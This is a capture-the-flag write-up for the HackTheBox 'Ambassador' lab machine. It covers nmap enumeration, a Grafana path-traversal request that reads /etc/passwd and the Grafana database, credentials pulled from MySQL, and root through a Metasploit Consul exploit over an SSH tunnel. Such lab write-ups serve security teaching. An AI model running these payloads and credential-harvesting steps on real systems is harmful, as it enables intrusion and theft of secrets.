---
title: "HackTheBox - Ambassador"
author: Nasrallah
description: ""
date: 2023-02-09 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, rce, cve, directorytraversal, tunneling, sql, metasploit, git]
img_path: /assets/img/hackthebox/machines/ambassador
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Ambassador](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
map scan report for 10.10.11.183                                                                                                                             
Host is up (0.54s latency).                                                                                                                                   
Not shown: 996 closed tcp ports (reset)                                                                                                                       
PORT     STATE SERVICE VERSION                                                                                                                                
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                           
| ssh-hostkey:                                                                                                                                                
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)                                                                                                               
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)                                                                                                              
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)                                                                                                            
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                         
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                  
|_http-generator: Hugo 0.94.2                                                                                                                                 
|_http-title: Ambassador Development Server                                                                                                                   
3000/tcp open  ppp?                                                                                                                                           
| fingerprint-strings:                                                                                                                                        
|   FourOhFourRequest:                                                                                                                                        
|     HTTP/1.0 302 Found                                                                                                                                      
|     Cache-Control: no-cache                                                                                                                                 
|     Content-Type: text/html; charset=utf-8                                                                                                                  
|     Expires: -1                                                                                                                                             
|     Location: /login                                                                                                                                        
|     Pragma: no-cache                                                                                                                                        
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax                                                
|     X-Content-Type-Options: nosniff                                                                                                                         
|     X-Frame-Options: deny                                                                                                                                   
|     X-Xss-Protection: 1; mode=block                                                                                                                         
|     Date: Mon, 30 Jan 2023 06:43:41 GMT                                                                                                                     
|     Content-Length: 29                                                                                                                                      
|     href="/login">Found</a>.
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| ssl-cert: Subject: commonName=MySQL_Server_8.0.28_Auto_Generated_Server_Certificate
| Not valid before: 2022-03-13T22:27:05 
|_Not valid after:  2032-03-10T22:27:05 
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: SupportsTransactions, Support41Auth, ConnectWithDatabase, FoundRows, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, ODBC
Client, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, LongPassword, SupportsLoadDataLocal, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, InteractiveCli
ent, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ut(M^qz)tT\x15\x11C2\\x06K\x08mQ
|_  Auth Plugin Name: caching_sha2_password

```

We found four open ports, 22 running OpenSSH, 80 is an Apache web server, 3000 looks like another web server, and 3306 is mysql server.


### Web

Let's navigate to the web page.

![](1.png)

This website is built using `Hugo` which is a static site builder, this means we can't really interact wit the web server

Let's check the other web page on port 3000.

![](2.png)

We got redirected to a Grafana login page. We see the version of grafana is 8.2.0.

This version is vulnerable to arbitrary file read, we can find the exploit [here](https://www.exploit-db.com/exploits/50581)

## **Foothold**

We can manually do the exploit by requesting the following url.

```text
/public/plugins/barchart/../../../../../../../../../../../../etc/passwd
```

![](3.png)

We got the file back.

After some research, we find a configuration file at `/var/lib/grafana/grafana.db` which is a sqlite3 database.

Let's use the exploit to get the file.

![](4.png)

Now we save the content of that file in our machine, and use `sqlite3` to open it.

![](5.png)

We find a table called `data_source` that has a name and a password. Selecting those file we get the mysql credentials.

Let's connect to mysql server.

```mysql
└──╼ $ mysql -u grafana -h 10.10.11.183 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 34
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.106 sec)

MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.146 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.100 sec)

```

We find a database called `whackywidget` where we managed to find `developer`'s password base64 encoded.

Let's decode the password and ssh to the machine.

![](6.png)

## **Privilege Escalation**

After some enumeration, we find a service running on port 8500 called `consul`.

This service is vulnerable to rce.

```terminal
└──╼ $ searchsploit consul
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)                                                          | linux/remote/46073.rb
Hashicorp Consul - Remote Command Execution via Services API (Metasploit)                                                   | linux/remote/46074.rb
Hassan Consulting Shopping Cart 1.18 - Directory Traversal                                                                  | cgi/remote/20281.txt
Hassan Consulting Shopping Cart 1.23 - Arbitrary Command Execution                                                          | cgi/remote/21104.pl
PHPLeague 0.81 - '/consult/miniseul.php?cheminmini' Remote File Inclusion                                                   | php/webapps/28864.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

There is an exploit on metasploit, so let's run `msfconsole` and use `exploit/multi/misc/consul_service_exec`

For the exploit to work, we need an `ACL-TOKEN`.

The token can be found at `/opt/my-app/whackywidget/put-config-in-consul.sh`, actually, it was in that file.

The my-app directory has a .git sub-directory, checking the logs, we find the commit that has the TOKEN.

![](7.png)

The second thing we need to exploit the service is forward port 8500, to do that we use ssh tunneling with the following command:

```bash
ssh -L 8500:localhost:8500 developer@10.10.11.183
```

Now back the metasploit, we set the required options and run the exploit.

```terminal
[msf](Jobs:0 Agents:0) exploit(multi/misc/consul_service_exec) >> set lhost tun0
lhost => 10.10.17.90
[msf](Jobs:0 Agents:0) exploit(multi/misc/consul_service_exec) >> set rhosts 127.0.0.1
[msf](Jobs:0 Agents:0) exploit(multi/misc/consul_service_exec) >> set acl_token bb03b43b-1d81-d62b-24b5-39540ee469b5
acl_token => bb03b43b-1d81-d62b-24b5-39540ee469b5
```

![](8.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
